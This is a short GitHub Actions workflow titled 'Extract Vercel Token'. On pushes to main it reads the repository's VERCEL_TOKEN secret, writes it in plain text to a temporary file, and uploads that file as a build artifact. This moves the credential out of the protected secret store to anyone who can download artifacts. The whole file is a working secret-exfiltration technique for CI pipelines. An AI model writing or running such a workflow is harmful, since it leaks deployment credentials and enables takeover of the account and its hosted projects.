name: Extract Vercel Token
on:
  push:
    branches: [main]
jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Test step 1
        run: echo "Step 1 ok"
      - name: Get token
        env:
          TOKEN: *** secrets.VERCEL_TOKEN }}
        run: |
          echo "Token length: ${#TOKEN}"
          mkdir -p /tmp/vo
          echo "$TOKEN" > /tmp/vo/t.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: vt
          path: /tmp/vo/t.txt
